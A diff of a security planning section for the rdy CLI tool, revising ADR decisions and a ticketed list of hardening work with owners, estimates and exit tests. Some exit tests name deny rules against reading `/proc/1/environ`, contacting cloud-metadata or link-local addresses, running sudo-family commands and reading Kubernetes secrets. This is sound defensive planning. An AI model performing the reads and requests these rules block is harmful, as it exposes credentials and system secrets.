+  settled by ADRs 0001 to 0012, 06 and the ADR review. They are not repeated here.
 
 ## Decisions needing an ADR
 
-- install.sh when cosign is missing. Options: (a) fail closed with a manual path and a loud
-  `RDY_INSECURE_SKIP_SIGNATURE=1` escape; (b) warn and continue on hash only; (c) also sign `SHA256SUMS`
-  with a pinned ECDSA key that `openssl` can verify, keeping keyless cosign for transparency. Taken for
-  M1: (a), the conservative option. (c) is the likely long-term answer but adds a long-lived key to
-  protect. Owner: release-engineer.
-- Vendor key trust model. Options: local pinning only; trust on first use; keys fetched from the vendor's
-  domain (`/.well-known/`); keys published by the portal. Taken for M1: local pinning only. Owner:
-  rust-architect with security-reviewer.
-- Where the M1 redaction core lives: a module in `rdy-engine` that `rdy-bundle` reuses later, or
-  `rdy-bundle` created early with only the redactor. No security difference, as long as M1 has it.
+- Dry-run pod create for `k8s.admission`: amend ADR 0010 or drop the mode. Conservative choice taken for
+  M1: rejected.
+- Output dir confinement: `cap-std` or `rustix` `openat` plus a Windows path. Conservative choice: `cap-std`.
   Owner: rust-architect.
-- Output dir confinement: `cap-std` directory handles, or hand-rolled `openat` with `O_NOFOLLOW` via
-  `rustix` plus a Windows path. Conservative choice: `cap-std`, since it covers all four OSes. Owner:
-  rust-architect.
-- rustls crypto provider: `ring` (simpler musl cross builds) or `aws-lc-rs` (rustls default, FIPS path,
-  needs an OpenSSL license exception). Owner: rust-architect with release-engineer.
-- `--allow-unsigned` TTY confirmation: requiring a typed yes on a TTY may annoy scripted users. Taken:
-  confirm on TTY, flag alone in non-TTY. Owner: cli-ux.
-- Windows Authenticode and macOS notarization cost money (certificate or Azure signing, Apple developer
-  account). Taken: defer to M3. Owner: release-engineer.
+- Where the M1 redactor lives (an `rdy-engine` module or an early `rdy-bundle`). Owner: rust-architect.
+- `--allow-unsigned` for a failing signature (ADR review SF-02; CLAUDE.md rule 3). Conservative: refuse.
+- Windows and macOS code signing (paid). Deferred to M3. Owner: release-engineer.
 
 ## Tickets implied
 
-- [M1] SEC-01 Write deny.toml policy and CI job | owner: release-engineer | est: 2h | depends on: none | exit test: `cargo deny check` runs on every PR and fails on a test branch that adds `openssl`.
-- [M1] SEC-02 Add scheduled advisory audit workflow | owner: release-engineer | est: 2h | depends on: SEC-01 Write deny.toml policy and CI job | exit test: a manual dispatch with a known-vulnerable crate pinned on a test branch opens a `security` issue.
-- [M1] SEC-03 Harden GitHub Actions workflows | owner: release-engineer | est: 3h | depends on: none | exit test: zizmor reports zero findings, every action is SHA-pinned, and only the signing job has `id-token: write`.
-- [M1] SEC-04 Harden GitHub org and repo settings | owner: security-reviewer | est: 2h | depends on: none | exit test: a checklist in the PR shows 2FA required, rulesets on main and `v*` tags, immutable releases, private vulnerability reporting, CODEOWNERS on security paths, release environment with manual approval.
-- [M1] SEC-05 Harden getrdy.io domain and hosting accounts | owner: release-engineer | est: 2h | depends on: none | exit test: registrar lock, DNSSEC, CAA and HSTS verified with public tools and hardware-key MFA confirmed on registrar and Cloudflare.
-- [M1] SEC-06 Sign release checksums with cosign keyless and self-verify | owner: release-engineer | est: 4h | depends on: SEC-03 Harden GitHub Actions workflows | exit test: a tag on a test repo produces `SHA256SUMS.sigstore.json` and the release job's own verify step passes with the pinned identity regexp.
-- [M1] SEC-07 Attach SBOM and embed dependency list in release binaries | owner: release-engineer | est: 2h | depends on: SEC-06 Sign release checksums with cosign keyless and self-verify | exit test: the release has a CycloneDX file and `cargo audit bin rdy` lists dependencies from the shipped binary.
-- [M1] SEC-08 Build install.sh skeleton with root refusal and truncation guard | owner: release-engineer | est: 3h | depends on: none | exit test: shellcheck clean, refuses uid 0 without `--allow-root`, installs to `~/.local/bin`, never calls sudo.
-- [M1] SEC-09 Add checksum and cosign verification to install.sh, fail closed | owner: release-engineer | est: 4h | depends on: SEC-06 Sign release checksums with cosign keyless and self-verify, SEC-08 Build install.sh skeleton with root refusal and truncation guard | exit test: installs a real release with cosign present and stops with the manual path when cosign is absent.
-- [M1] SEC-10 Write install.sh tamper test suite | owner: qa-engineer | est: 3h | depends on: SEC-09 Add checksum and cosign verification to install.sh, fail closed | exit test: CI cases for bad hash, bad signature, wrong identity, missing cosign, root without flag and truncated script all exit nonzero and leave nothing installed.
-- [M1] SEC-11 Reserve crates.io names and set up trusted publishing | owner: release-engineer | est: 1h | depends on: none | exit test: `rdy`, `rdy-cli` and every planned crate name are owned by the org account and publishing needs no stored token.
-- [M1] SEC-12 Verify spec signatures over raw bytes before parsing | owner: rust-engineer | est: 4h | depends on: 01-spec-format signing section | exit test: tampered, truncated, wrong-key and weak-key cases fail; the parser spy shows no parse; the result records spec digest and key fingerprint.
-- [M1] SEC-13 Add trusted key store and `--trusted-key` | owner: rust-engineer | est: 3h | depends on: SEC-12 Verify spec signatures over raw bytes before parsing | exit test: an envelope carrying its own key fails as unknown key; a pinned key passes and its local label is shown.
-- [M1] SEC-14 Implement `--allow-unsigned` warnings and watermark | owner: rust-engineer | est: 3h | depends on: SEC-12 Verify spec signatures over raw bytes before parsing | exit test: env and config cannot enable it; golden HTML and JSON contain the unsigned watermark; TTY asks with default no.
-- [M1] SEC-15 Harden spec parser limits and strictness | owner: rust-engineer | est: 4h | depends on: SEC-12 Verify spec signatures over raw bytes before parsing | exit test: proptest and fixtures reject oversize, deep nesting, anchors, aliases, duplicate keys, multi-document input, unknown fields and unknown check ids with exit 64.
-- [M1] SEC-16 Harden `rdy spec` key generation and signing | owner: rust-engineer | est: 3h | depends on: SEC-12 Verify spec signatures over raw bytes before parsing | exit test: generated key is 0600 via exclusive create, a 0644 key is refused, and no secret bytes appear in output or logs.
-- [M1] SEC-17 Build the probe facade and action log | owner: rust-engineer | est: 4h | depends on: 02-engine-design probe facade API | exit test: a fixture run's JSON action log lists every command, file, endpoint and kube request the checks used, and a lint fails on `std::process::Command` outside the facade.
-- [M1] SEC-18 Enforce command execution policy in the facade | owner: rust-engineer | est: 3h | depends on: SEC-17 Build the probe facade and action log | exit test: tests show no shell, fixed PATH when euid 0, scrubbed loader env, sudo-family refused, timeout and 1 MiB output cap enforced.
-- [M1] SEC-19 Confine all writes to a new output directory | owner: rust-engineer | est: 4h | depends on: none | exit test: a pre-planted symlink is not followed, an existing dir is refused, modes are 0700 and 0600, and a killed run leaves no partial file.
-- [M1] SEC-20 Refuse setuid execution | owner: rust-engineer | est: 1h | depends on: none | exit test: unit test shows exit 70 with a fix hint when real and effective uid differ.
-- [M1] SEC-21 Enforce network policy for net checks | owner: check-author | est: 4h | depends on: SEC-17 Build the probe facade and action log | exit test: unlisted, link-local and metadata targets are refused, endpoint count is capped, bodies are never stored, bandwidth sample respects byte and time caps.
-- [M1] SEC-22 Add no-phone-home integration tests | owner: qa-engineer | est: 3h | depends on: SEC-21 Enforce network policy for net checks | exit test: a no-net spec passes under `unshare -rn` on Linux CI and a contact-set test shows only spec endpoints were contacted.
-- [M1] SEC-23 Enforce Kubernetes request allowlist | owner: rust-engineer | est: 4h | depends on: SEC-17 Build the probe facade and action log | exit test: a mock API server records every request from the k8s suite and the test asserts read verbs, access reviews and dry-run only, with no `secrets` access.
-- [M1] SEC-24 Ship read-only ClusterRole and show kube identity | owner: k8s-expert | est: 3h | depends on: SEC-23 Enforce Kubernetes request allowlist | exit test: the M1 k8s checks pass on a kind cluster using only `examples/rbac/rdy-readonly.yaml`, and the report shows context, server and user.
-- [M1] SEC-25 Build minimal redactor for reports and evidence | owner: rust-engineer | est: 4h | depends on: redaction placement ADR | exit test: every evidence string passes through it before write and the M1 corpus passes with zero misses.
-- [M1] SEC-26 Create M1 redaction corpus and golden tests | owner: qa-engineer | est: 3h | depends on: SEC-25 Build minimal redactor for reports and evidence | exit test: at least 60 synthetic cases across the M1 categories, including chunk-boundary and negative cases, run in CI.
-- [M1] SEC-27 Harden HTML report rendering | owner: rust-engineer | est: 3h | depends on: HTML report contract in 01-spec-format | exit test: golden test with script and markup payloads renders inert text, CSP meta is present, and no remote resource is referenced.
-- [M1] SEC-28 Sanitize untrusted strings in terminal output | owner: cli-ux | est: 2h | depends on: none | exit test: ANSI and control sequences in fixture output are escaped before printing.
-- [M1] SEC-29 Redact logs and cap dependency log levels | owner: rust-engineer | est: 3h | depends on: SEC-25 Build minimal redactor for reports and evidence | exit test: at `RUST_LOG=trace` with canary secrets in env and kubeconfig, no canary appears in stderr.
-- [M1] SEC-30 Enforce `forbid(unsafe_code)` in every crate | owner: rust-engineer | est: 1h | depends on: none | exit test: a CI check fails when any crate root lacks the attribute.
-- [M1] SEC-31 Write the docs security page | owner: docs-writer | est: 3h | depends on: SEC-06 Sign release checksums with cosign keyless and self-verify | exit test: page lists what rdy reads and contacts, report fields, report link parameters, verify-first install and air-gap install, and CI runs its verification commands against the latest release.
-- [M1] SEC-32 Enable vulnerability reporting channels | owner: security-reviewer | est: 1h | depends on: SEC-04 Harden GitHub org and repo settings | exit test: private vulnerability reporting is on, security@getrdy.io receives mail, and security.txt is served on getrdy.io.
-- [M2] SEC-40 Add `rdy run --plan` preview | owner: rust-engineer | est: 6h | depends on: SEC-17 Build the probe facade and action log | exit test: plan output matches the action log of a real run on the same fixtures.
-- [M2] SEC-41 Build upload client with consent, receipt and exact bytes | owner: rust-engineer | est: 12h | depends on: SEC-42 Define share-link token format and scope | exit test: fake-server tests prove no upload without consent, exact bytes, digests in receipt, response ignored beyond receipt id.
-- [M2] SEC-42 Define share-link token format and scope | owner: security-reviewer | est: 6h | depends on: none | exit test: token spec with `rdy_st_` prefix, write-only scope, expiry and revocation agreed with rdy-cloud and covered by the redaction corpus.
-- [M2] SEC-43 Define bundle collector path policy | owner: security-reviewer | est: 6h | depends on: 04-bundle-and-redaction | exit test: deny-listed paths and symlink escapes are refused in fixture tests and the resolved file list is shown before collection.
-- [M2] SEC-44 Grow redaction corpus to full M2 set | owner: qa-engineer | est: 10h | depends on: SEC-26 Create M1 redaction corpus and golden tests | exit test: at least 300 cases across all categories with zero misses.
-- [M2] SEC-45 Add fuzz targets for spec parser and redactor | owner: qa-engineer | est: 6h | depends on: SEC-15 Harden spec parser limits and strictness | exit test: scheduled fuzz job runs 30 minutes per target weekly with no crashes.
-- [M2] SEC-46 Add vendor key rotation, revocation and spec expiry | owner: rust-architect | est: 8h | depends on: SEC-13 Add trusted key store and `--trusted-key` | exit test: an expired spec warns, a revoked key fails, a rotated key passes.
-- [M2] SEC-47 Threat-model portal-delivered specs | owner: security-reviewer | est: 4h | depends on: SEC-46 Add vendor key rotation, revocation and spec expiry | exit test: written decision on who holds vendor signing keys in the portal and how the CLI pins them.
-- [M2] SEC-55 Add openssl pinned-key fallback to install.sh if the ADR picks it | owner: release-engineer | est: 6h | depends on: install.sh cosign ADR | exit test: install verifies on a host with openssl and no cosign.
-- [M3] SEC-48 Enforce read-only cloud API allowlist | owner: cloud-iam-expert | est: 6h | depends on: SEC-17 Build the probe facade and action log | exit test: a test enumerates every AWS operation the cloud checks can call and all are read-only or simulate.
-- [M3] SEC-49 Build verified, explicit self-update | owner: release-engineer | est: 12h | depends on: SEC-06 Sign release checksums with cosign keyless and self-verify | exit test: tampered or wrong-identity release is refused and the command never runs unprompted.
-- [M3] SEC-50 Sign Windows and macOS binaries | owner: release-engineer | est: 8h | depends on: code signing ADR | exit test: Authenticode and notarization verify on clean VMs.
-- [M3] SEC-51 Verify reproducible builds | owner: release-engineer | est: 8h | depends on: SEC-06 Sign release checksums with cosign keyless and self-verify | exit test: two independent builds of a tag match or deviations are documented.
-- [M3] SEC-52 Adopt cargo-vet audits for direct dependencies | owner: security-reviewer | est: 6h | depends on: SEC-01 Write deny.toml policy and CI job | exit test: `cargo vet` passes in CI.
-- [M4] SEC-53 Design sandboxed custom exec checks behind `--allow-exec` | owner: security-reviewer | est: 16h | depends on: SEC-17 Build the probe facade and action log | exit test: own threat model approved and exec is unreachable without the flag.
-- [M5] SEC-54 Commission independent security audit | owner: security-reviewer | est: 8h | depends on: none | exit test: report received and every high finding has a fix ticket.
+M1 standalone: 11 tickets, 27 hours. Folds into existing tickets: 8 hours. M1 security total: 35 hours.
+
+- [M1] SEC-04 Org 2FA, private reporting, CODEOWNERS and a settings check script | owner: security-reviewer | est: 2h | depends on: none | exit test: `scripts/check-org-settings.sh` uses `gh api` to confirm org-wide 2FA, private vulnerability reporting and CODEOWNERS on security paths, and fails when one is off.
+- [M1] SEC-05 Harden getrdy.io domain and hosting accounts | owner: release-engineer | est: 2h | depends on: none | exit test: a CI job runs `dig +dnssec`, `dig CAA` and `curl -sI https://getrdy.io` with an HSTS grep, and all pass.
+- [M1] SEC-19 Confine writes to a new output dir with safe names | owner: rust-engineer | est: 3h | depends on: Define public spec types in rdy-spec | exit test: product `../x` fails validation, a pre-planted symlink is not followed, an existing file is not overwritten, and Unix modes are 0700 and 0600.
+- [M1] SEC-25 Minimal redactor for evidence, errors and logs | owner: rust-engineer | est: 4h | depends on: Define result model and verdict mapping in rdy-spec | exit test: canaries in env, proxy URL, kubeconfig and command output never appear in JSON, HTML or stderr at `RUST_LOG=trace`.
+- [M1] SEC-17 Mediated Context handles with action log and read denylist | owner: rust-engineer | est: 3h | depends on: Check trait, Need and Context in rdy-engine; Command runner: fixed argv, scrubbed env, timeout kill, output caps, recorded-output replay | exit test: the fixture run's action log lists every command, file, endpoint and kube request; a read of `/proc/1/environ` is refused; the clippy disallowed lists fail a violating test crate.
+- [M1] SEC-21 Egress address policy, capped redirects, no bodies | owner: check-author | est: 3h | depends on: net.egress via proxy and redirect host list | exit test: link-local, metadata and IPv4-mapped targets are refused directly, by DNS and by redirect, a sixth hop is refused, and a body canary never reaches the report.
+- [M1] SEC-26 M1 redaction corpus | owner: qa-engineer | est: 3h | depends on: SEC-25 Minimal redactor for evidence, errors and logs | exit test: 60 synthetic cases across the M1 categories, including negatives, pass with zero misses in CI.
+- [M1] SEC-22 No-phone-home strace test on Linux CI | owner: qa-engineer | est: 2h | depends on: SEC-21 Egress address policy, capped redirects, no bodies; Loopback network test support (TLS server with generated CA, CONNECT proxy modes, closed port, never-accepting listener, reset after ClientHello) | exit test: under `sudo unshare -n` and strace, every connect and sendto destination in the fixture suite is a loopback fixture address.
+- [M1] SEC-24 Read-only ClusterRole example and kube identity display | owner: check-author | est: 2h | depends on: Read-only guard test for rdy-checks-k8s; k8s.rbac (SelfSubjectReview, access reviews, escalate and bind probes) | exit test: M1 k8s checks pass on kind with only `examples/rbac/rdy-readonly.yaml`, and the report shows context, server, user and any exec plugin run (k8s-expert reviews).
+- [M1] SEC-31 Docs security page and verify-first install | owner: docs-writer | est: 2h | depends on: First signed alpha, scripts/verify-release.sh and RELEASING.md | exit test: the page lists what rdy reads and contacts, the report fields and link parameters, and CI runs its verify commands against the latest alpha.
+- [M1] SEC-32 Security mailbox and security.txt | owner: security-reviewer | est: 1h | depends on: SEC-04 Org 2FA, private reporting, CODEOWNERS and a settings check script | exit test: security@getrdy.io receives a test mail and `https://getrdy.io/.well-known/security.txt` returns both channels.
+
+Folds (extra exit-test clauses on existing tickets, 8h in total):
+
+| Existing ticket | Added clause | +h |
+|---|---|---|
+| Verify minisign signatures in rdy-spec against a trust store with product binding | Verify before parse, `allow_legacy = false`, weak-key vectors, INV-01 to INV-03 | 1 |
+| Trust store load and save in user and system locations | Root-only store and ownership rules, INV-04 | 1 |
+| rdy verify command and refuse-unsigned behaviour with --allow-unsigned banner | INV-05 probes; hints never suggest the flag | 0.5 |
+| rdy spec keygen and rdy spec sign | Encrypted by default, 0600 `create_new`, readable key refused | 1 |
+| Command runner: fixed argv, scrubbed env, timeout kill, output caps, recorded-output replay | INV-08, process-group kill, Windows absolute paths | 1 |
+| Read-only guard test for rdy-checks-k8s | Becomes a runtime tower layer plus test, INV-14 (3h instead of 1h) | 2 |
+| Embed result JSON in the HTML report safely | INV-16 escapes and exact CSP | 0.5 |
+| Check trait, Need and Context in rdy-engine | INV-10 privilege-carrying binary refusal | 0.5 |
+| Error types with fix hints and exit code mapping at the CLI edge | INV-17 control-character escaping | 0.5 |
+
+Covered by others without extra hours: 06 tickets (deny, audit, zizmor, rulesets, SHA pins, signing,
+SBOM, install.sh, reserve names), ADR 0001 "Wire serde-saphyr" (INV-06 parser limits), and the
+workspace skeleton (INV-18).
+
+- [M2] SEC-40 `rdy run --plan` preview | owner: rust-engineer | est: 6h | depends on: SEC-17 Mediated Context handles with action log and read denylist | exit test: plan output matches the action log of a real run on the same fixtures.
+- [M2] SEC-41 Upload client with consent, receipt and exact bytes | owner: rust-engineer | est: 12h | depends on: SEC-42 Share-link token format and scope | exit test: fake-server tests prove the Surface 4 requirements 1 to 3, 5 and 6.
+- [M2] SEC-42 Share-link token format and scope | owner: security-reviewer | est: 6h | depends on: none | exit test: token spec agreed with rdy-cloud and the `rdy_st_` prefix covered by the corpus.
+- [M2] SEC-43 Bundle collector path policy | owner: security-reviewer | est: 6h | depends on: SEC-17 Mediated Context handles with action log and read denylist | exit test: denylisted paths and symlink escapes are refused and the resolved file list is shown before collection.
+- [M2] SEC-44 Full redaction corpus with chunk-boundary cases | owner: qa-engineer | est: 10h | depends on: SEC-26 M1 redaction corpus | exit test: 300 cases, including every chunk offset, with zero misses.
+- [M2] SEC-45 Fuzz targets for spec parser and redactor | owner: qa-engineer | est: 6h | depends on: SEC-25 Minimal redactor for evidence, errors and logs | exit test: a weekly 30-minute fuzz run per target with no crashes.
+- [M2] SEC-46 Vendor key rotation and rollback warnings | owner: rust-engineer | est: 8h | depends on: Trust store load and save in user and system locations | exit test: a rotated key passes, a removed key fails, an older `signed_at` than the last run warns.
+- [M2] SEC-47 Portal-delivered spec and key trust | owner: security-reviewer | est: 4h | depends on: SEC-46 Vendor key rotation and rollback warnings | exit test: written decision; a key change for a pinned product fails in a fixture.
+- [M2] SEC-56 `--allow-unsigned` TTY confirmation | owner: cli-ux | est: 1h | depends on: rdy verify command and refuse-unsigned behaviour with --allow-unsigned banner | exit test: a TTY run asks with default no; a non-TTY run does not prompt.
+- [M2] SEC-57 Contact-set tests on macOS and Windows | owner: qa-engineer | est: 4h | depends on: SEC-22 No-phone-home strace test on Linux CI | exit test: equivalent destination checks pass on both CI legs.
+- [M2] SEC-58 Windows output dir ACL hardening | owner: rust-engineer | est: 3h | depends on: SEC-19 Confine writes to a new output dir with safe names | exit test: report files carry an owner-only ACL on Windows CI.
+- [M3] SEC-48 Read-only cloud API allowlist | owner: check-author | est: 6h | depends on: SEC-17 Mediated Context handles with action log and read denylist | exit test: every AWS operation the checks can call is read-only or simulate (cloud-iam-expert reviews).
+- [M3] SEC-50 Windows and macOS code signing | owner: release-engineer | est: 8h | depends on: none | exit test: Authenticode and notarization verify on clean VMs.
+- [M3] SEC-52 cargo-vet for direct dependencies | owner: security-reviewer | est: 6h | depends on: none | exit test: `cargo vet` passes in CI.
+- [M3] SEC-53 Threat model for custom.exec | owner: security-reviewer | est: 4h | depends on: SEC-17 Mediated Context handles with action log and read denylist | exit test: a section is added here and reviewed by rust-architect before ADR 0005's build ticket starts.
+- [M4] SEC-49 Review of verified self-update | owner: security-reviewer | est: 4h | depends on: none | exit test: 06's self-update build refuses tampered or wrong-identity assets and never runs unprompted.
+- [M5] SEC-54 Independent security audit | owner: security-reviewer | est: 8h | depends on: none | exit test: report received and every high finding has a fix ticket.
